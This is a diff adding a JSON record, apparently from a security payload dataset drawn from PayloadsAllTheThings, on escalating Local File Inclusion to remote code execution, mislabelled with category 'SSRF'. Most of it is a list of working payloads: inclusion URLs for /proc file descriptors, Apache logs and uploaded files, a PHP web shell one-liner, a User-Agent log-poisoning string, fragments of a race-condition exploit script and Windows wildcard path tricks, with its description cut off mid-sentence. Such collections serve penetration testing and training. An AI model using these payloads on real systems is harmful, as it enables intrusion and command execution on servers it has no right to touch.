@@ -1,0 +1,27 @@
+{
+  "id": "ssrf-0ea940c247ae",
+  "category": "SSRF",
+  "title": "LFI to RCE",
+  "description": "# LFI to RCE\n\n> LFI (Local File Inclusion) is a vulnerability that occurs when a web application includes files from the local file system, often due to insecure handling of user input. If an attacker can control the file path, they can potentially include sensitive or dangerous files such as system files (/etc/passwd), configuration files, or even malicious files that could lead to Remote Code Execution (RCE).\n\n## Summary\n\n- [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)\n- [LFI to RCE via ",
+  "payloads": [
+    "http://example.com/index.php?page=/proc/$PID/fd/$FD",
+    "User-Agent: <?=phpinfo(); ?>",
+    "- GNU C Library (`glibc`) <=  2.39",
+    "- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)",
+    "If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).",
+    "http://example.com/index.php?page=path/to/uploaded/file.png",
+    "requests.post('http://target.com/index.php?c=index.php', f)",
+    "url = 'http://target.com/index.php?c=/tmp/php' + fname",
+    "if 'load average' in r.text:  # <?php echo system('uptime');",
+    "`FindFirstFile` allows using masks (`<<` as `*` and `>` as `?`) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.",
+    "- `*`/`<<` : Represents any sequence of characters.",
+    "Then either bruteforce the 65536 filenames or use a wildcard character like: `http://site/vuln.php?inc=c:\\windows\\temp\\php<<`",
+    "Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)",
+    "http://example.com/index.php?page=/var/log/apache/access.log",
+    "http://example.com/index.php?page=/var/log/apache/error.log"
+  ],
+  "references": [
+    "PayloadsAllTheThings/File Inclusion/LFI-to-RCE.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
